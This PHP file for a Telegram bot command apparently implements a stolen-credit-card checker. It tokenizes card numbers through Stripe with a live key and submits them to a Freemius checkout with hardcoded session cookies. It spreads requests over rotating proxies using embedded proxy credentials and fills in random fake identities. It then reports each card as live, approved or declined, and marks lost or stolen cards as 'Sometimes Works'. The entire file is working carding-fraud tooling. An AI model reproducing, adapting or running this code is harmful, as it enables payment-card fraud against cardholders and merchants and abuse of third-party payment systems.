<?php

///////============[FREEMIUS AUTH (2req) Command]============///////

if ((strpos($message, "/fr2") === 0) || (strpos($message, "!fr2") === 0)){
$lista = substr($message, 4);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon    = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

//==================[BIN LOOK-UP]=================//

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$scheme = $binna['scheme'];
$type = $binna['type'];
$brand = $binna['brand'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$code = $binna['country']['alpha2'];
$bank = $binna['bank']['name'];
curl_close($ch);

//==================[Randomizing Details]==================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//=======================[Proxys]========================//
$Websharegay = rand(0,250);
$rp1 = array(
    1 => 'gsaqyxfp-US-rotate:r8vt7l84i50u',
    2 => 'irtgefsr-US-rotate:s6pgtddbhfxc',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead! ❌";
}

//========================[1 REQ]=======================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=76643&pasted_fields=number&guid=NA&muid=0a3e681c-ef88-4912-8ad7-ea1419909722a7d6d6&sid=ecc0e767-d975-41c1-88f1-5f8da275309f8d67cb&key=pk_live_eP8c8rXxkvgPXGLfBw2wjX4p&payment_user_agent=stripe.js%2F7315d41&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[address_zip]='.$zip.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://checkout.freemius.com/action/service/subscribe/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: checkout.freemius.com',
'method: POST',
'path: /action/service/subscribe/',
'scheme: https',
'accept: application/json, text/javascript',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'content-type: application/json; charset=UTF-8',
'cookie: cookie: _ga=GA1.2.1934261522.1620381887; _fbp=fb.1.1620381889869.1950640162; SL_C_23361dd035530_KEY=044b28d90a7bb06ea65d0794a2cee9f1fcc8fd7f; __adroll_fpc=a3a410d29f95c9cf88edd289dc385ada-1620381908662; __cfduid=d894b2dcf5ef46b346b04f94312f914391620381913; __ar_v4=KG32CYLNFZBLFHFIYBD5ST%3A20210506%3A2%7CEJBU7OCODBCR7HGEFJSXJ5%3A20210506%3A2%7CHDB442H3WZGRPP454AICJU%3A20210506%3A2; __stripe_mid=0a3e681c-ef88-4912-8ad7-ea1419909722a7d6d6; __fs_session=2otv7cdvdt6rsgq0nkte4qup11; _gid=GA1.2.830312687.1620728034; __stripe_sid=ecc0e767-d975-41c1-88f1-5f8da275309f8d67cb; _gat=1',
'origin: https://checkout.freemius.com',
'referer: https://checkout.freemius.com/mode/dialog/plugin/3545/plan/5701/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'{"user_firstname":"'.$name.'","user_lastname":"'.$last.'","user_email":"ronald'.$last.'11@gmail.com","update_license":false,"cart_id":"357490","mode":"dialog","plugin_id":"3545","plugin_public_key":"pk_de9caa44b85150adcf7406ad2e895","pricing_id":"4766","billing_cycle":"annual","payment_method":"cc","country_code":"US","auto_install":false,"is_marketing_allowed":true,"is_affiliation_enabled":true,"is_sandbox":false,"failed_zipcode_purchases_count":0,"payment_token":"'.$id.'","prev_url":"https://checkout.freemius.com/mode/dialog/plugin/3545/plan/5701/"}');
$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);


//==================[Responses]======================//

if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, "The credit card's zip code validation failed.")) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '▬▬▬▬»[[ <b>G -> FR AUTH</b> ]]«▬▬▬▬%0A<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Zip Failed Validation.%0A</i><b>Status</b> => <i>LIVE! ✅ </i><b>[CVV-M]{AVS-N}%0A</b><i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif ((strpos($result2, '"success":true'))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>3D Redirect.%0A</i><b>Status</b> => <i>Try On Other Gate.!%0A</i><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Insufficient Funds.%0A</i><b>Status</b> => <i>LIVE! ✅  </i><b>[CVV-M]%0A</b><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


elseif ((strpos($result2, "The card's security code is incorrect.")) || (strpos($result2, "card_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '▬▬▬▬»[[ <b>G -> FR AUTH</b> ]]«▬▬▬▬%0A[<b>Card</b>] -> <i><code>'.$lista.'</code>%0A</i>[<b>Status</b>] -> <b>APPROVED!</b> ✅%0A[<b>Result</b>] -> [<b>CCN-M</b>]%0A<i>——————————»«——————————%0A</i>[<b>Bin Info</b>] -> <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i>[<b>Bank</b>] => <i>'.$bank.'%0A</i><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Not Support Purchase.%0A</i><b>Status</b> => <i>LIVE! ✅  </i><b>[CVV-M]%0A</b><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Pickup/Lost/Stolen.%0A</i><b>Status</b> => <i>LIVE! ✅ </i><b>[CVV-M]{Sometimes Works}%0A</b><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


elseif ((strpos($result2, "'do_not_honor'")) || (strpos($result2, "Decline code: 'do_not_honor'"))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Do not honor.%0A</i><b>Status</b> => <i>DECLINED! ❌</i><b>%0A</b><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif ((strpos($result2, "generic_decline")) || (strpos($result2, "Decline code: 'generic_decline'"))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Generic Decline.%0A</i><b>Status</b> => <i>DECLINED! ❌ %0A</i><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}



elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Incorrect Card No.%0A</i><b>Status</b> => <i>DECLINED! ❌</i>%0A<b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Expired Card.%0A</i><b>Status</b> => <i>DECLINED! ❌</i>%0A<b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


elseif ((strpos($result2, "card_declined")) || (strpos($result2, 'Your card was declined.'))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Card Declined.%0A</i><b>Status</b> => <i>DECLINED! ❌</i>%0A<b>Gate</b> => Freemius.%0A<i>————————»«————————%0A</i><b>Bin Data</b> => <i>'.$type.'-'.$brand.' -> '.$code.'('.$emoji.')%0A</i><b>Bank</b> => <i>'.$bank.'%0A</i><i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif (strpos($result2, "An error occurred while processing the card.")){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>An error occurred while processing the card. Please try again in few minutes.%0A</i><b>Status</b> => <i>ERROR! [Try On Other Gate.!]%0A</i><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif (strpos($result2, "Invalid payment token.")){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Incorrect No. or Incorrect Format.!%0A</i><b>Status</b> => <i>ERROR! ❌ [try Again, or Report this to Admin.!]%0A</i><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif ((strpos($result2, '"field":"email"')) || (strpos($result2, "Your email address either has a typo or it was flagged for security reasons."))){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Your Email is Invalid or Flaaged.!%0A</i><b>Status</b> => <i>ERROR! ❌ [Try Again.]%0A</i><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif (strpos($result2, '-1')){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>Update Noise(-1).!%0A</i><b>Status</b> => <i>ERROR! ❌ [Report this to owner.!]%0A</i><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif ((strpos($result2, "missing input"))){
sendMessage($chatId, '❌Invalid Command❌%0A❗️GATE STRIPE AUTH%0A❗️Example: /sa2 xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /sa2 4010990064374103|09|2026|345', $message_id);
}

elseif(!$result2){
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>'.$result2.'%0A</i><b>Status</b> => <i>Dont Know!❌  [try Again, or Report to owner.!]%0A</i><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}
else{
sendMessage($chatId, '<b>Card</b> => <i><code>'.$lista.'</code>%0A</i><b>Responce</b> => <i>'.$result2.'%0A</i><b>Status</b> => <i>Error ❌ [try Again, or Report to owner.!]%0A</i><b>Gate</b> => Freemius.%0A<i>————————»«————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}
curl_close($ch);

unlink("cookies.txt");
}

//=======================[Freemius Auth End]========================//

?>